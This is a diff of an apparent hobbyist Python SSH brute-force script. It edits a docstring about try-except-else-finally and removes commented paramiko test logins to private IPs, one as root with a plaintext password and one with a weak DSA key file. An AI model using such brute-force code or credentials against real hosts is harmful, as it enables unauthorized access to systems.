@@ -5,11 +5,7 @@ Author: Yusuf Kassim
 
 This script attempts to brute force targets using a password list against the SSH login.
 Important lesson: the else block in a try-except-else segment is only executed if no exception is raised.
-IN order to execute the code in the else block even if an exception is rasied, I must use try-except-finally 
-
-With exception handling if an exception is caught then we know the code in the try block failed, and
-the script will just return and move on. If its try-except-else the code in the else block will not be
-executed. If its try-except-finally the code in the finally block will be executed. You can use try-except-else-finally.
+In order to execute the code in the else block even if an exception is rasied, I must use try-except-finally 
 
 I am undecided as to extend this to more than one target. 
 """
@@ -139,32 +135,4 @@ class SSH_Brute(object):
 
 test = SSH_Brute()
 test.main()
-
-
-
-"""
-try:
-    y = paramiko.SSHClient()
-    y.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    y.connect("192.168.1.127",port=22,username="ykassim",key_filename="/home/binyamin/Python/blackhat/Compromise/SSH/Weak_Keys/dsa/1024/8a59f903cf3b70257e4708f6560a0407-24429",timeout=3)
-except Exception,e:
-    print str(e)
-else:
-    print "success"
-finally:
-    print "did it work??"
-
-
-try:
-    y = paramiko.SSHClient()
-    y.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    y.connect("192.168.1.120",port=22,username="root",password="Iwtdbi2010",timeout=3)
-except Exception,e:
-    print str(e)
-else:
-    print "success"
-finally:
-    print "yes"
-"""
-
 
